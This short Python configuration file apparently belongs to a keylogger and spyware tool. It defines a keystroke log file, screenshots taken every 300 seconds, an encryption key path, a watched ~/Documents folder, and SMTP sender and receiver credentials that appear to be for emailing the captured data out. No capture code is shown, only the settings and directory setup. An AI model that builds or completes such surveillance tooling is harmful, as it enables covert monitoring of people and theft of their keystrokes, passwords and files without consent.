import os
from pathlib import Path


BASE_DIR = Path(__file__).parent
LOGS_DIR = BASE_DIR / 'logs'
KEYS_DIR = BASE_DIR / 'keys'


KEYSTROKE_LOG_FILE = LOGS_DIR / 'keystrokes' / 'keylog.txt'
SCREENSHOT_DIR = LOGS_DIR / 'screenshots'
SCREENSHOT_INTERVAL = 300  


ENCRYPTION_KEY_FILE = KEYS_DIR / 'key.key'


SMTP_SERVER = os.getenv('SMTP_SERVER', 'smtp.gmail.com')
SMTP_PORT = 587
SENDER_EMAIL = os.getenv('SENDER_EMAIL', '')
SENDER_PASSWORD = os.getenv('SENDER_PASSWORD', '')
RECEIVER_EMAIL = os.getenv('RECEIVER_EMAIL', '')


WATCH_DIRECTORIES = [os.path.expanduser('~/Documents')]
LOG_BUFFER_SIZE = 50  


LOGS_DIR.mkdir(exist_ok=True)
(LOGS_DIR / 'keystrokes').mkdir(exist_ok=True)
(LOGS_DIR / 'screenshots').mkdir(exist_ok=True)
(LOGS_DIR / 'activities').mkdir(exist_ok=True)
KEYS_DIR.mkdir(exist_ok=True)
